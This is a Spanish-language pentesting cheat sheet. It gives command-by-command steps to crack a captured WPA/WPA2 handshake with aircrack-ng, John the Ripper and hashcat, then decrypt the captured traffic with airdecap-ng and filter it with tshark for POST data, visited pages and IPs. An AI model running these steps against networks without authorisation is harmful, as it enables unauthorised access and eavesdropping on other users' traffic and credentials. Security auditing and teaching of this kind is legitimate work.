# HandShake Cracking

El **crackeo del handshake** en redes Wi-Fi WPA/WPA2 implica *capturar* el *4-way handshake* entre un cliente y un punto de acceso, y luego intentar descifrar la *PSK* mediante un ataque de diccionario o fuerza bruta. Este proceso nos permite obtener la contraseña de la red y, por lo tanto, acceso a la misma.

----
# Cracking the handshake

###### Manual Mode (*Johntheripper*)

Una vez que tengamos el archivo de captura .cap, tendriamos que convertir dicho archivo .cap a .hccap, ya que este archivo es compatible con la herramienta de fuerza bruta `johntheripper`.

```shell 
aircrack-ng -J {name_file.hccap} {file.cap}
```

De esta manera tendriamos un nuevo archivo .hccap el cual haciendo uso de la herramienta `hccap2john` podremos extraer únicamente el hash.

```shell
hccap2john {name_file.hccap} > {file_to_john}
```

Ahora, solo quedaria hacer uso de `john` para realizar un ataque de fuerza bruta al archivo creado. 

```shell
john --wordlist=/path/to/wordlist.txt {file_to_john}
```
###### Manual Mode (*Hashcat*)

Una vez que tengamos el archivo .cap, tendriamos que convertir dicho archivo .cap a .hccapx, formato que la herramienta de fuerza bruta `hashcat` puede interpretar. Para eso haremos uso de la herramienta `hcxpcapngtool`.

```bash
hcxpcapngtool -o hash.hccapx {capture}.cap
```

Ahora solo queda hacer uso de la herramienta `hashcat` para relizar un ataque de fuerza bruta al archivo creado.

```bash
hashcat -m 2500 hash.hccapx /path/to/wordlist.txt
```

###### Automatic Mode (*Aircrack-ng*)

Una vez que tengamos el archivo de captura .cap, podriamos realizar un ataque de fuerza bruta a la contraseña encriptada del AP que se encuentra en todo el archivo .cap. 

```shell
aircrack-ng -w /path/to/wordlist.txt {file.cap} 
```

----
# Spying 

Una vez conseguida la contraseña de la red, podriamos conectarnos a la misma para proceder con intentar llevar a cabo el proceso tradicional de cualquier auditoria a los dispositivos de la red, o bien podriamos comenzar a capturar el trafico de la red, desencriptandolo para asi poder ver todo el trafico entero, es decir, páginas visitadas, metodos http, direcciones IP, etc. 
###### Decrypt traffic

```shell 
airdecap-ng -p {password} -e {essid} {file.cap}
```

Tras la ejecución de este comando, en caso de haber introducido correctamente la credencial, todo el tráfico previamente o posteriormente capturado podrá ser desencriptado, pudiendo asi con herramientas como `tshark` o `wireshark`, filtrar por diversas peticiones, por ejemplo, solicitudes POST, GET, etc.

```shell
tshark -r {file-dec.cap} -Y "http.request.method==POST" -Tjson 
tshark -r {file-dec.cap} -Y "http.request.method==POST" -Tfields -e http.file_data 
```

Filtros más específicos como paquetes con una IP de origen o destino específica.

```bash
tshark -r {file-dec.cap} -Y "ip.src == 192.168.1.1 || ip.dst == 192.168.1.1"   
```

Filtrar por puertos.

```bash
tshark -r {file-dec.cap} -Y "tcp.port == 80"
```

Mostrar campos específicos.

```bash
tshark -r {file-dec.cap} -Y -T fields -e ip.src -e ip.dst
```

Filtrar paquetes ARP, ICMP

```bash
tshark -r {file-dec.cap} -Y "arp"
tshark -r {file-dec.cap} -Y "icmp"
```

Filtrar paquetes por porotoclos de aplicación

```bash
tshark -r {file-dec.cap} -Y "dns"
tshark -r {file-dec.cap} -Y "http" 
tshark -r {file-dec.cap} -Y "tcp" 
```

